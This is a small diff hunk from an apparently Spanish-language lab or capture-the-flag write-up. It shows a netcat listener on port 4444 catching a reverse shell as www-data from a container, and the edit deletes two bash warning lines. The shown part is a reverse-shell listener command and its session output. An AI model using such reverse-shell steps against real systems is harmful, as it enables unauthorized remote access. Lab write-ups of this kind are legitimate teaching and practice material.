@@ -141,8 +141,6 @@ Si nos hemos puesto en escucha antes de ejecutar el payload anterior, habremos o
 └─$ nc -nlvp 4444  
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 58404
-bash: cannot set terminal process group (23): Inappropriate ioctl for device
-bash: no job control in this shell
 www-data@d4d4dbf1a2c0:/var/www/html$ whoami
 whoami
 www-data
